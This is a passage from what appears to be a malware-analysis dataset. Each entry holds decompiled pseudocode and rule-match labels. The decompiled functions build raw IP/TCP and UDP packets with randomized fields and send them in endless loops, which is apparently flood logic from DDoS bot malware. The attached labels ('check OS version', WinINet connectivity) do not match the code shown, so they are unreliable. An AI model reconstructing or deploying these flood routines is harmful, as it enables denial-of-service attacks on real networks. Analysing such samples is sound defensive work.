(uVar7 & 1) << 2 | (uVar8 & 1) * '\\x02' | uVar10;\n            uVar14 = fcn.0804db30();\n            *(puVar1 + 0x22) = uVar14;\n            if (uVar6 != 0) {\n                puVar1[0x21] = puVar1[0x21] | 8;\n            }\n            uVar23 = fcn.0804dcd0(puVar1 + 0x28, iVar24, puVar1 + 0x14, puVar1 + 0x14);\n            iStack20 = iStack20 + 1;\n        } while (iStack20 < uVar17);\n    }\n    iStack128 = iVar24 + 0x14;\n    iStack132 = iVar24 + 0x28;\n    do {\n        do {\n        } while (uVar17 == 0);\n        iStack20 = 0;\n        uVar29 = iVar24 + 0x14;\n        do {\n            iVar2 = *(iVar18 + iStack20 * 4);\n            iVar27 = param_2 + iStack20 * 0x18;\n            uVar21 = param_2;\n            if (*(iVar27 + 0x14) < 0x20) {\n                uVar15 = *(iVar27 + 0x10);\n                uVar16 = *(iVar27 + 0x10) >> 0x10;\n                uVar21 = fcn.0804db30();\n                uVar6 = *(param_2 + 0x14 + iStack20 * 0x18);\n                iVar27 = (uVar21 >> (uVar6 & 0x1f)) + CONCAT22(uVar15 >> 8 | uVar15 << 8, uVar16 >> 8 | uVar16 << 8);\n                uVar15 = iVar27;\n                uVar16 = iVar27 >> 0x10;\n                iVar27 = CONCAT22(uVar15 >> 8 | uVar15 << 8, uVar16 >> 8 | uVar16 << 8);\n                *(iVar2 + 0x10) = iVar27;\n                uVar21 = uVar6;\n            }\n            if (iVar25 == -1) {\n                iVar27 = fcn.0804db30();\n                *(iVar2 + 0xc) = iVar27;\n                uVar21 = extraout_ECX;\n            }\n            if (uVar11 == 0xffff) {\n                iVar27 = fcn.0804db30();\n                *(iVar2 + 4) = iVar27;\n                uVar21 = extraout_ECX_00;\n            }\n            if (uVar12 == 0xffff) {\n                iVar27 = fcn.0804db30();\n                *(iVar2 + 0x14) = iVar27;\n                uVar21 = extraout_ECX_01;\n            }\n            if (uVar13 == 0xffff) {\n                iVar27 = fcn.0804db30();\n                *(iVar2 + 0x16) = iVar27;\n                uVar21 = extraout_ECX_02;\n            }\n            if (iVar19 == 0xffff) {\n                iVar27 = fcn.0804db30();\n                *(iVar2 + 0x18) = iVar27;\n                uVar21 = extraout_ECX_03;\n            }\n            if (iVar20 == 0xffff) {\n                iVar27 = fcn.0804db30();\n                *(iVar2 + 0x1c) = iVar27;\n                uVar21 = extraout_ECX_04;\n            }\n            if (cVar9 != '\\0') {\n                fcn.0804dcd0(iVar2 + 0x28, iVar24, iVar27, iVar27);\n                uVar21 = extraout_ECX_05;\n            }\n            *(iVar2 + 10) = 0;\n            uVar14 = fcn.0804bd80(iVar2, 0x14, uVar21, uVar21);\n            *(iVar2 + 10) = uVar14;\n            *(iVar2 + 0x24) = 0;\n            uVar14 = fcn.0804bdd0(iVar2, iVar2 + 0x14, uVar29 >> 8 | uVar29 * 0x100, iStack128);\n            *(iVar2 + 0x24) = uVar14;\n            *(iStack20 * 0x18 + 2 + param_2) = *(iVar2 + 0x16);\n            fcn.08050352(iVar26, iVar2, iStack132, 0x4000, iStack20 * 0x18 + param_2, 0x10);\n            iStack20 = iStack20 + 1;\n        } while (iStack20 < uVar17);\n    } while( true );\n}\n",
        "token_count": 2505
    },
    "0804a620": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nvoid fcn.0804a620(uint8_t param_1, uint32_t param_2, uchar param_3, uint param_4)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    uchar uVar4;\n    char cVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint8_t uVar8;\n    char cVar9;\n    uint8_t uVar10;\n    uint16_t uVar11;\n    uint16_t uVar12;\n    uint16_t uVar13;\n    ushort uVar14;\n    uint16_t uVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    int32_t iVar24;\n    int32_t iVar25;\n    int32_t iVar26;\n    int32_t iVar27;\n    uint uVar28;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    uint32_t extraout_ECX_03;\n    uint32_t extraout_ECX_04;\n    uint32_t extraout_ECX_05;\n    uint16_t uVar29;\n    int32_t iStack132;\n    int32_t iStack128;\n    int32_t iStack20;\n    \n    uVar17 = param_1;\n    iVar18 = fcn.08050b95(uVar17, 4);\n    uVar3 = fcn.08048690(param_3, param_4, 2, 0);\n    uVar11 = fcn.08048690(param_3, param_4, 3, 0xffff);\n    uVar4 = fcn.08048690(param_3, param_4, 4, 0x40);\n    cVar5 = fcn.08048690(param_3, param_4, 5, 0);\n    uVar12 = fcn.08048690(param_3, param_4, 6, 0xffff);\n    uVar13 = fcn.08048690(param_3, param_4, 7, 0xffff);\n    iVar19 = fcn.08048690(param_3, param_4, 0x11, 0xffff);\n    iVar20 = fcn.08048690(param_3, param_4, 0x12, 0xffff);\n    uVar21 = fcn.08048690(param_3, param_4, 0xb, 0);\n    uVar22 = fcn.08048690(param_3, param_4, 0xc, 0);\n    uVar6 = fcn.08048690(param_3, param_4, 0xd, 0);\n    uVar7 = fcn.08048690(param_3, param_4, 0xe, 0);\n    uVar8 = fcn.08048690(param_3, param_4, 0xf, 1);\n    uVar23 = fcn.08048690(param_3, param_4, 0x10, 0);\n    iVar24 = fcn.08048690(param_3, param_4, 0, 0x200);\n    cVar9 = fcn.08048690(param_3, param_4, 1, 1);\n    iVar25 = fcn.08048630(param_3, param_4, 0x19, *0x80588a0);\n    iVar26 = fcn.080503d0(2, 3, 6);\n    if (iVar26 == -1) {\n        do {\n            fcn.08051819(1);\n            fcn.08051819(1);\n        } while( true );\n    }\n    iStack20 = 1;\n    iVar27 = fcn.08050395(iVar26, 0, 3, &iStack20, 4);\n    if (iVar27 == -1) {\n        fcn.0804eaab(iVar26);\n        do {\n            fcn.08051819(1);\n        } while( true );\n    }\n    iStack20 = 0;\n    if (uVar17 != 0) {\n        uVar29 = iVar24 + 0x28;\n        uVar23 = uVar23 & 1;\n        uVar10 = uVar23;\n        do {\n            iVar27 = iStack20;\n            uVar28 = fcn.08050b95(0x5e6, 1, uVar23, uVar23);\n            *(iVar18 + iVar27 * 4) = uVar28;\n            puVar1 = *(iVar18 + iStack20 * 4);\n            *puVar1 = 0x45;\n            puVar1[1] = uVar3;\n            *(puVar1 + 2) = uVar29 >> 8 | uVar29 * 0x100;\n            *(puVar1 + 4) = uVar11 >> 8 | uVar11 << 8;\n            puVar1[8] = uVar4;\n            if (cVar5 != '\\0') {\n                *(puVar1 + 6) = 0x40;\n            }\n            puVar1[9] = 6;\n            *(puVar1 + 0xc) = iVar25;\n            *(puVar1 + 0x10) = *(param_2 + 0x10 + iStack20 * 0x18);\n            *(puVar1 + 0x14) = uVar12 >> 8 | uVar12 << 8;\n            *(puVar1 + 0x16) = uVar13 >> 8 | uVar13 << 8;\n            *(puVar1 + 0x18) = iVar19 >> 8 | iVar19 << 8;\n            puVar1[0x20] = puVar1[0x20] & 0xf | 0x50;\n            puVar1[0x21] = puVar1[0x21] & 0xc0 | (uVar21 & 1) << 5 | (uVar22 & 1) << 4 | (uVar6 & 1) << 3 |\n                           (uVar7 & 1) << 2 | (uVar8 & 1) * '\\x02' | uVar10;\n            uVar14 = fcn.0804db30();\n            *(puVar1 + 0x22) = uVar14;\n            uVar23 = fcn.0804dcd0(puVar1 + 0x28, iVar24, puVar1 + 0x14, puVar1 + 0x14);\n            iStack20 = iStack20 + 1;\n        } while (iStack20 < uVar17);\n    }\n    iStack128 = iVar24 + 0x28;\n    iStack132 = iVar24 + 0x14;\n    do {\n        do {\n        } while (uVar17 == 0);\n        iStack20 = 0;\n        uVar29 = iVar24 + 0x14;\n        do {\n            iVar2 = *(iVar18 + iStack20 * 4);\n            iVar27 = param_2 + iStack20 * 0x18;\n            uVar21 = param_2;\n            if (*(iVar27 + 0x14) < 0x20) {\n                uVar15 = *(iVar27 + 0x10);\n                uVar16 = *(iVar27 + 0x10) >> 0x10;\n                uVar21 = fcn.0804db30();\n                uVar6 = *(param_2 + 0x14 + iStack20 * 0x18);\n                iVar27 = (uVar21 >> (uVar6 & 0x1f)) + CONCAT22(uVar15 >> 8 | uVar15 << 8, uVar16 >> 8 | uVar16 << 8);\n                uVar15 = iVar27;\n                uVar16 = iVar27 >> 0x10;\n                iVar27 = CONCAT22(uVar15 >> 8 | uVar15 << 8, uVar16 >> 8 | uVar16 << 8);\n                *(iVar2 + 0x10) = iVar27;\n                uVar21 = uVar6;\n            }\n            if (iVar25 == -1) {\n                iVar27 = fcn.0804db30();\n                *(iVar2 + 0xc) = iVar27;\n                uVar21 = extraout_ECX;\n            }\n            if (uVar11 == 0xffff) {\n                iVar27 = fcn.0804db30();\n                *(iVar2 + 4) = iVar27;\n                uVar21 = extraout_ECX_00;\n            }\n            if (uVar12 == 0xffff) {\n                iVar27 = fcn.0804db30();\n                *(iVar2 + 0x14) = iVar27;\n                uVar21 = extraout_ECX_01;\n            }\n            if (uVar13 == 0xffff) {\n                iVar27 = fcn.0804db30();\n                *(iVar2 + 0x16) = iVar27;\n                uVar21 = extraout_ECX_02;\n            }\n            if (iVar19 == 0xffff) {\n                iVar27 = fcn.0804db30();\n                *(iVar2 + 0x18) = iVar27;\n                uVar21 = extraout_ECX_03;\n            }\n            if (iVar20 == 0xffff) {\n                iVar27 = fcn.0804db30();\n                *(iVar2 + 0x1c) = iVar27;\n                uVar21 = extraout_ECX_04;\n            }\n            if (cVar9 != '\\0') {\n                fcn.0804dcd0(iVar2 + 0x28, iVar24, iVar27, iVar27);\n                uVar21 = extraout_ECX_05;\n            }\n            *(iVar2 + 10) = 0;\n            uVar14 = fcn.0804bd80(iVar2, 0x14, uVar21, uVar21);\n            *(iVar2 + 10) = uVar14;\n            *(iVar2 + 0x24) = 0;\n            uVar14 = fcn.0804bdd0(iVar2, iVar2 + 0x14, uVar29 >> 8 | uVar29 * 0x100, iStack132);\n            *(iVar2 + 0x24) = uVar14;\n            *(iStack20 * 0x18 + 2 + param_2) = *(iVar2 + 0x16);\n            fcn.08050352(iVar26, iVar2, iStack128, 0x4000, iStack20 * 0x18 + param_2, 0x10);\n            iStack20 = iStack20 + 1;\n        } while (iStack20 < uVar17);\n    } while( true );\n}\n",
        "token_count": 2470
    },
    "0804abe0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0804abe0(uint8_t param_1, int32_t param_2, uchar param_3, uint param_4)\n\n{\n    uint8_t uVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uchar uVar5;\n    uint8_t uVar6;\n    uchar uVar7;\n    uint8_t uVar8;\n    uint16_t uVar9;\n    ushort uVar10;\n    uint16_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    uint32_t uVar17;\n    int32_t iVar18;\n    uint uVar19;\n    uint8_t uVar20;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    uint32_t extraout_ECX_03;\n    uint32_t extraout_ECX_04;\n    uint32_t extraout_ECX_05;\n    uint32_t extraout_ECX_06;\n    uint32_t extraout_ECX_07;\n    uint32_t extraout_ECX_08;\n    uint32_t extraout_ECX_09;\n    uint8_t uVar21;\n    uint var_10h;\n    uint var_14h;\n    int32_t iStack80;\n    uchar uStack75;\n    uint16_t uStack74;\n    uchar uStack72;\n    char cStack71;\n    uint16_t uStack70;\n    uint uStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uchar auStack40 [16];\n    int32_t aiStack24 [2];\n    \n    uVar12 = param_1;\n    iVar13 = fcn.08050b95(uVar12, 4);\n    uStack75 = fcn.08048690(var_10h, var_14h, 2, 0);\n    uStack74 = fcn.08048690(var_10h, var_14h, 3, 0xffff);\n    uStack72 = fcn.08048690(var_10h, var_14h, 4, 0x40);\n    cStack71 = fcn.08048690(var_10h, var_14h, 5, 1);\n    uStack70 = fcn.08048690(var_10h, var_14h, 6, 0xffff);\n    uVar14 = fcn.08048690(var_10h, var_14h, 7, 0xffff);\n    iVar15 = fcn.08048690(var_10h, var_14h, 0x11, 0xffff);\n    iVar16 = fcn.08048690(var_10h, var_14h, 0x12, 0);\n    uVar5 = fcn.08048690(var_10h, var_14h, 0xb, 0);\n    uVar6 = fcn.08048690(var_10h, var_14h, 0xc, 0);\n    uStack68 = uStack68 & 0xffffff | uVar6 << 0x18;\n    uVar17 = fcn.08048690(var_10h, var_14h, 0xd, 0);\n    uVar7 = fcn.08048690(var_10h, var_14h, 0xe, 0);\n    uVar6 = fcn.08048690(var_10h, var_14h, 0xf, 0);\n    uVar8 = fcn.08048690(var_10h, var_14h, 0x10, 0);\n    iStack64 = fcn.08048690(var_10h, var_14h, 0x1a, 0);\n    iStack60 = fcn.08048630(var_10h, var_14h, 0x19, *0x80588a0);\n    iStack80 = fcn.080503d0(2, 3, 6);\n    if (iStack80 != -1) {\n        aiStack24[0] = 1;\n        iVar18 = fcn.08050395(iStack80, 0, 3, aiStack24, 4);\n        if (iVar18 != -1) {\n            uStack68 = uVar14 & 0xffff | CONCAT11(uStack68._3_1_, uVar5) << 0x10;\n            uVar14 = fcn.0804db30();\n            fcn.0804dbc0(auStack40, uVar14 % 0xd + 3, uVar14, uVar14, uVar14 * 0x4ec4ec4f);\n            auStack40[auStack40] = 0;\n            aiStack24[0] = 0;\n            uVar14 = extraout_ECX;\n            if (uVar12 != 0) {\n                uStack56._0_3_ = uStack56 & 0xff0000 | iVar15 & 0xffff;\n                uStack56 = CONCAT13(uVar7, uStack56) & 0x1ffffff;\n                uVar17 = uVar17 & 1;\n                cVar4 = uVar17;\n                uVar20 = (uStack68 >> 0x10 & 1) << 5;\n                do {\n                    iVar18 = aiStack24[0];\n                    uVar19 = fcn.08050b95(0xffff, 1, uVar17, uVar17);\n                    *(iVar13 + iVar18 * 4) = uVar19;\n                    puVar2 = *(iVar13 + aiStack24[0] * 4);\n                    *puVar2 = 0x45;\n                    puVar2[1] = uStack75;\n                    if (iStack64 == 1) {\n                        *(puVar2 + 2) = 0x2c00;\n                    }\n                    else {\n                        *(puVar2 + 2) = 0x3c00;\n                    }\n                    *(puVar2 + 4) = uStack74 >> 8 | uStack74 << 8;\n                    puVar2[8] = uStack72;\n                    if (cStack71 != '\\0') {\n                        *(puVar2 + 6) = 0x40;\n                    }\n                    puVar2[9] = 6;\n                    *(puVar2 + 0xc) = iStack60;\n                    *(puVar2 + 0x10) = *(param_2 + 0x10 + aiStack24[0] * 0x18);\n                    *(puVar2 + 0x14) = uStack70 >> 8 | uStack70 << 8;\n                    *(puVar2 + 0x16) = uStack68 >> 8 | uStack68 << 8;\n                    uVar1 = puVar2[0x21];\n                    *(puVar2 + 0x18) = uStack56 >> 8 | uStack56 << 8;\n                    puVar2[0x20] = puVar2[0x20] & 0xf | 0xa0;\n                    uVar21 = uVar1 & 0xdf | uVar20;\n                    puVar2[0x21] = uVar21;\n                    if (iStack64 == 1) {\n                        puVar2[0x21] = uVar21 | 0x10;\n                    }\n                    else {\n                        puVar2[0x21] = uVar1 & 0xcf | uVar20 | (uStack68 >> 0x18 & 1) << 4;\n                    }\n                    puVar2[0x21] = puVar2[0x21] & 0xf0 | cVar4 * '\\b' | uStack56._3_1_ << 2 | (uVar6 & 1) * '\\x02' |\n                                   uVar8 & 1;\n                    puVar2[0x28] = 2;\n                    puVar2[0x29] = 4;\n                    uVar9 = fcn.0804db30();\n                    puVar2[0x2c] = 4;\n                    puVar2[0x2d] = 2;\n                    uVar9 = (uVar9 & 0xf) + 0x578;\n                    puVar2[0x2e] = 8;\n                    puVar2[0x2f] = 10;\n                    *(puVar2 + 0x2a) = uVar9 >> 8 | uVar9 * 0x100;\n                    uVar17 = fcn.0804db30();\n                    puVar2[0x38] = 1;\n                    puVar2[0x39] = 3;\n                    puVar2[0x3a] = 3;\n                    puVar2[0x3b] = 6;\n                    *(puVar2 + 0x30) = uVar17;\n                    *(puVar2 + 0x34) = 0;\n                    aiStack24[0] = aiStack24[0] + 1;\n                    uVar14 = extraout_ECX_00;\n                } while (aiStack24[0] < uVar12);\n            }\n            do {\n                if (uVar12 == 0) {\n                    do {\n                    } while( true );\n                }\n                aiStack24[0] = 0;\n                do {\n                    iVar3 = *(iVar13 + aiStack24[0] * 4);\n                    iVar18 = param_2 + aiStack24[0] * 0x18;\n                    if (*(iVar18 + 0x14) < 0x20) {\n                        uVar19 = *(iVar18 + 0x10);\n                        uVar17 = fcn.0804db30();\n                        uVar9 = uVar19;\n                        uVar11 = uVar19 >> 0x10;\n                        uVar6 = *(param_2 + 0x14 + aiStack24[0] * 0x18);\n                        uVar14 = uVar6;\n                        iVar18 = (uVar17 >> (uVar6 & 0x1f)) +\n                                 CONCAT22(uVar9 >> 8 | uVar9 << 8, uVar11 >> 8 | uVar11 << 8);\n                        uVar9 = iVar18;\n                        uVar11 = iVar18 >> 0x10;\n                        *(iVar3 + 0x10) = CONCAT22(uVar9 >> 8 | uVar9 << 8, uVar11 >> 8 | uVar11 << 8);\n                        if (iStack60 == -1) goto code_r0x0804b0f0;\ncode_r0x0804afd6:\n                        if (uStack74 != 0xffff) goto code_r0x0804afe2;\ncode_r0x0804b104:\n                        uVar10 = fcn.0804db30();\n                        *(iVar3 + 4) = uVar10;\n                        uVar14 = extraout_ECX_03;\n                        if (uStack70 == 0xffff) goto code_r0x0804b119;\ncode_r0x0804afee:\n                        if (uStack68 != -1) goto code_r0x0804affa;\ncode_r0x0804b12e:\n                        uVar10 = fcn.0804db30();\n                        *(iVar3 + 0x16) = uVar10;\n                        uVar14 = extraout_ECX_05;\n                        if (iVar15 == 0xffff) goto code_r0x0804b145;\ncode_r0x0804b008:\n                        if (iVar16 != 0xffff) goto code_r0x0804b016;\ncode_r0x0804b15b:\n                        uVar19 = fcn.0804db30();\n                        *(iVar3 + 0x1c) = uVar19;\n                        uVar14 = extraout_ECX_07;\n                    }\n                    else {\n                        if (iStack60 != -1) goto code_r0x0804afd6;\ncode_r0x0804b0f0:\n                        uVar19 = fcn.0804db30();\n                        *(iVar3 + 0xc) = uVar19;\n                        uVar14 = extraout_ECX_02;\n                        if (uStack74 == 0xffff) goto code_r0x0804b104;\ncode_r0x0804afe2:\n                        if (uStack70 != 0xffff) goto code_r0x0804afee;\ncode_r0x0804b119:\n                        uVar10 = fcn.0804db30();\n                        *(iVar3 + 0x14) = uVar10;\n                        uVar14 = extraout_ECX_04;\n                        if (uStack68 == -1) goto code_r0x0804b12e;\ncode_r0x0804affa:\n                        if (iVar15 != 0xffff) goto code_r0x0804b008;\ncode_r0x0804b145:\n                        uVar19 = fcn.0804db30();\n                        *(iVar3 + 0x18) = uVar19;\n                        uVar14 = extraout_ECX_06;\n                        if (iVar16 == 0xffff) goto code_r0x0804b15b;\ncode_r0x0804b016:\n                    }\n                    if (uStack68._2_1_ != '\\0') {\n                        uVar10 = fcn.0804db30();\n                        *(iVar3 + 0x26) = uVar10;\n                        uVar14 = extraout_ECX_08;\n                    }\n                    *(iVar3 + 10) = 0;\n                    uVar10 = fcn.0804bd80(iVar3, 0x14, uVar14, uVar14);\n                    *(iVar3 + 10) = uVar10;\n                    *(iVar3 + 0x24) = 0;\n                    if (iStack64 == 1) {\n                        uVar10 = fcn.0804bdd0(iVar3, iVar3 + 0x14, 0x1800, 0x18);\n                        *(iVar3 + 0x24) = uVar10;\n                        *(aiStack24[0] * 0x18 + 2 + param_2) = *(iVar3 + 0x16);\n                        fcn.08050352(iStack80, iVar3, 0x2c, 0x4000, param_2 + aiStack24[0] * 0x18, 0x10);\n                        uVar14 = extraout_ECX_09;\n                    }\n                    else {\n                        uVar10 = fcn.0804bdd0(iVar3, iVar3 + 0x14, 0x2800, 0x28);\n                        *(iVar3 + 0x24) = uVar10;\n                        *(aiStack24[0] * 0x18 + 2 + param_2) = *(iVar3 + 0x16);\n                        fcn.08050352(iStack80, iVar3, 0x3c, 0x4000, param_2 + aiStack24[0] * 0x18, 0x10);\n                        uVar14 = extraout_ECX_01;\n                    }\n                    aiStack24[0] = aiStack24[0] + 1;\n                } while (aiStack24[0] < uVar12);\n            } while( true );\n        }\n        fcn.0804eaab(iStack80);\n    }\n    return;\n}\n",
        "token_count": 3471
    },
    "0804b200": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0804b200(uint8_t param_1, int32_t param_2, uint8_t param_3, int32_t param_4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint16_t uVar4;\n    uint16_t uVar5;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint16_t uVar8;\n    ushort uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    uint uVar15;\n    uint32_t extraout_ECX;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    int32_t iStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    uVar16 = param_1;\n    uVar17 = param_3;\n    iVar10 = fcn.08050b95(uVar16, 4);\n    iVar11 = fcn.08050b95(uVar16, 4);\n    uVar4 = fcn.08048690(uVar17, param_4, 7, 0xffff);\n    uVar5 = fcn.08048690(uVar17, param_4, 6, 0xffff);\n    uVar6 = fcn.08048690(uVar17, param_4, 0, 0x200);\n    cVar3 = fcn.08048690(uVar17, param_4, 1, 1);\n    uStack32 = 0;\n    uStack28 = 0;\n    uStack24 = 0;\n    uStack20 = 0;\n    if (uVar5 == 0xffff) {\n        uVar5 = fcn.0804db30();\n    }\n    else {\n        uVar5 = uVar5 >> 8 | uVar5 << 8;\n    }\n    uVar12 = param_1;\n    if (uVar12 != 0) {\n        uStack36 = 1;\n        uVar14 = uVar12;\n        do {\n            uVar15 = fcn.08050b95(0xffff, 1, uVar14, uVar14);\n            *(iVar10 + -4 + uStack36 * 4) = uVar15;\n            if (uVar4 == 0xffff) {\n                uVar9 = fcn.0804db30();\n                *(param_2 + 2) = uVar9;\n            }\n            else {\n                *(param_2 + 2) = uVar4 >> 8 | uVar4 << 8;\n            }\n            iVar13 = fcn.080503d0(2, 2, 0x11, uVar17);\n            *(iVar11 + -4 + uStack36 * 4) = iVar13;\n            if (iVar13 == -1) {\n                return;\n            }\n            uStack32 = uVar5 << 0x10 | 2;\n            uStack28 = 0;\n            fcn.080501ca(iVar13, &uStack32, 0x10, param_4);\n            uVar17 = extraout_ECX;\n            if (*(param_2 + 0x14) < 0x20) {\n                uVar15 = *(param_2 + 0x10);\n                uVar14 = fcn.0804db30();\n                uVar7 = uVar15;\n                uVar8 = uVar15 >> 0x10;\n                param_4 = CONCAT22(uVar7 >> 8 | uVar7 << 8, uVar8 >> 8 | uVar8 << 8);\n                uVar17 = *(param_2 + 0x14);\n                iVar13 = (uVar14 >> (*(param_2 + 0x14) & 0x1f)) + param_4;\n                uVar7 = iVar13;\n                uVar8 = iVar13 >> 0x10;\n                *(param_2 + 4) = CONCAT22(uVar7 >> 8 | uVar7 << 8, uVar8 >> 8 | uVar8 << 8);\n            }\n            fcn.080501f5(*(iVar11 + -4 + uStack36 * 4), param_2, 0x10, uVar17);\n            uVar14 = uStack36 + 1;\n            param_2 = param_2 + 0x18;\n            uVar17 = uVar16 + 1;\n            uStack36 = uVar14;\n        } while (uVar16 + 1 != uVar14);\n    }\n    do {\n        while( true ) {\n            do {\n            } while (uVar12 == 0);\n            if (cVar3 != '\\0') break;\n            iVar13 = 1;\n            do {\n                iVar1 = iVar13 * 4;\n                iVar2 = iVar13 * 4;\n                iVar13 = iVar13 + 1;\n                fcn.0805031f(*(iVar11 + -4 + iVar2), *(iVar10 + -4 + iVar1), uVar6, 0x4000);\n            } while (uVar16 + 1 != iVar13);\n        }\n        iStack40 = 1;\n        uVar17 = uVar12;\n        do {\n            uVar15 = *(iVar10 + -4 + iStack40 * 4);\n            fcn.0804dcd0(uVar15, uVar6, uVar17, uVar17);\n            uVar17 = fcn.0805031f(*(iVar11 + -4 + iStack40 * 4), uVar15, uVar6, 0x4000);\n            iStack40 = iStack40 + 1;\n        } while (iStack40 != uVar16 + 1);\n    } while( true );\n}\n",
        "token_count": 1311
    },
    "0804b4b0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0804b4b0(uint8_t param_1, uint32_t param_2, uint8_t param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    char cVar3;\n    uint16_t uVar4;\n    ushort uVar5;\n    uint16_t uVar6;\n    uint16_t uVar7;\n    ushort uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    uint uVar15;\n    uint32_t uVar16;\n    uint16_t uVar17;\n    uint32_t uVar18;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    uVar16 = param_1;\n    uVar18 = param_3;\n    iVar9 = fcn.08050b95(uVar16, 4);\n    iVar10 = fcn.08050b95(uVar16, 4);\n    uVar4 = fcn.08048690(uVar18, param_4, 7, 0xffff);\n    uVar11 = fcn.08048690(uVar18, param_4, 6, 0xffff);\n    uVar5 = fcn.08048690(uVar18, param_4, 0, 0x50e);\n    cVar3 = fcn.08048690(uVar18, param_4, 1, 1);\n    uStack32 = 0;\n    uStack28 = 0;\n    uStack24 = 0;\n    uStack20 = 0;\n    uVar17 = uVar11;\n    if (uVar17 == 0xffff) {\n        uVar17 = fcn.0804db30();\n    }\n    else {\n        uVar17 = uVar17 >> 8 | uVar17 << 8;\n        uVar11 = uVar11 & 0xffff0000 | uVar17;\n    }\n    uVar12 = param_1;\n    if (uVar12 != 0) {\n        uStack36 = param_2;\n        uStack40 = 1;\n        uVar14 = uVar12;\n        do {\n            uVar15 = fcn.08050b95(0xffff, 1, uVar14, uVar14);\n            *(iVar9 + -4 + uStack40 * 4) = uVar15;\n            if (uVar4 == 0xffff) {\n                uVar8 = fcn.0804db30();\n                *(uStack36 + 2) = uVar8;\n            }\n            else {\n                *(uStack36 + 2) = uVar4 >> 8 | uVar4 << 8;\n            }\n            iVar13 = fcn.080503d0(2, 2, 0, uVar18);\n            *(iVar10 + -4 + uStack40 * 4) = iVar13;\n            if (iVar13 == -1) {\n                return;\n            }\n            uStack32 = uVar17 << 0x10 | 2;\n            uStack28 = 0;\n            fcn.080501ca(iVar13, &uStack32, 0x10, uVar11);\n            if (*(uStack36 + 0x14) < 0x20) {\n                uVar15 = *(uStack36 + 0x10);\n                uVar18 = fcn.0804db30();\n                uVar6 = uVar15;\n                uVar7 = uVar15 >> 0x10;\n                uVar11 = CONCAT22(uVar6 >> 8 | uVar6 << 8, uVar7 >> 8 | uVar7 << 8);\n                iVar13 = (uVar18 >> (*(uStack36 + 0x14) & 0x1f)) + uVar11;\n                uVar6 = iVar13;\n                uVar7 = iVar13 >> 0x10;\n                *(uStack36 + 4) = CONCAT22(uVar6 >> 8 | uVar6 << 8, uVar7 >> 8 | uVar7 << 8);\n            }\n            fcn.080501f5(*(iVar10 + -4 + uStack40 * 4), uStack36, 0x10);\n            uStack40 = uStack40 + 1;\n            uVar14 = uStack36 + 0x18;\n            uVar18 = uVar16 + 1;\n            uStack36 = uVar14;\n        } while (uStack40 != uVar16 + 1);\n    }\n    uVar15 = fcn.0804ff0e(*0x8056528);\n    do {\n        while( true ) {\n            do {\n            } while (uVar12 == 0);\n            iVar13 = 1;\n            uVar18 = uVar12;\n            if (cVar3 != '\\0') break;\n            do {\n                fcn.0805031f(*(iVar10 + -4 + iVar13 * 4), *(iVar9 + -4 + iVar13 * 4), uVar5, 0x4000);\n                iVar1 = iVar13 * 4;\n                iVar13 = iVar13 + 1;\n                fcn.0805031f(*(iVar10 + -4 + iVar1), *0x8056528, uVar15, 0x4000);\n            } while (uVar16 + 1 != iVar13);\n        }\n        do {\n            uVar2 = *(iVar9 + -4 + iVar13 * 4);\n            fcn.0804dcd0(uVar2, uVar5, uVar18, uVar18);\n            fcn.0805031f(*(iVar10 + -4 + iVar13 * 4), uVar2, uVar5, 0x4000);\n            iVar1 = iVar13 * 4;\n            iVar13 = iVar13 